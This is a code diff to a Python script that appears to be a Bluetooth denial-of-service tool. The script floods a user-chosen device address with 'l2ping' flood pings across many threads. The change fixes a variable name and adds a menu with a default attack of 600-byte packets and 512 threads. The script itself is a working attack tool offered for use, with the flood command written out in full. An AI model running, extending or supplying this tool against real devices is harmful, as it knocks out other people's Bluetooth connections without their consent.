@@ -8,8 +8,8 @@ def setup_interface():
     system("sudo hciconfig -a hci0 up")
 
 
-def attack(pack_size, targed_addr):
-    system(f"sudo l2ping -i hci0 -s {pack_size} -f {targed_addr}")
+def attack(pack_size, target_addr):
+    system(f"sudo l2ping -i hci0 -s {pack_size} -f {target_addr}")
 
 
 def banner():
@@ -42,28 +42,48 @@ def main():
         banner()
         print()
 
-        targed_addr = input("{:>20}".format("Target address ~> "))
-
-        if len(targed_addr) < 1:
+        target_addr = input("{:>25}".format("Target address ~> "))
+        if len(target_addr) < 1:
             print("[!] ERROR: Target address is missing.")
             exit(0)
         
-        try:
-            pack_size = int(input("{:>20}".format("Packages size ~> ")))
-        except:
-            print("[!] ERROR: Packages size must be an integer.")
-            exit(0)
+        system("clear")
+        banner()
+        print()
+
+        print("{:>25}".format("[1] Default attack."))
+        print("{:>25}".format("[2] Custom attack. "))
+        print()
 
         try:
-            threads = int(input("{:>20}".format("Threads ~> ")))
+            choice = int(input("{:>25}".format("Select attack ~> ")))
+            if choice not in [1,2]:
+                raise Exception
         except:
-            print("[!] ERROR: Threads must be an integer.")
+            print("[!] ERROR: Select a valid option.")
             exit(0)
+
+        if choice == 2:
+            try:
+                pack_size = int(input("{:>25}".format("Packages size ~> ")))
+            except:
+                print("[!] ERROR: Packages size must be an integer.")
+                exit(0)
+    
+            try:
+                threads = int(input("{:>25}".format("Threads ~> ")))
+            except:
+                print("[!] ERROR: Threads must be an integer.")
+                exit(0)
+        elif choice == 1:
+            pack_size = 600
+            threads = 512
+
 
         print()
         system("clear")
         
-        print(f"\x1b[31m[*] Starting DOS attack to {targed_addr} in 3 seconds...")
+        print(f"\x1b[31m[*] Starting DOS attack to {target_addr} in 3 seconds...")
 
         for i in range(0, 3):
             print(f"[*] {3 - i}")
@@ -74,13 +94,14 @@ def main():
 
         for i in range(0, threads):
             print(f"[*] Built thread Nº {i + 1}")
-            Thread(target=attack, args=[pack_size, targed_addr]).start()
+            Thread(target=attack, args=[pack_size, target_addr]).start()
 
         print("[*] Built all threads...")
         print("[*] Starting...")
     else:
         print("Finishing...")
         exit(0)
+
 
 if __name__ == "__main__":
     try:
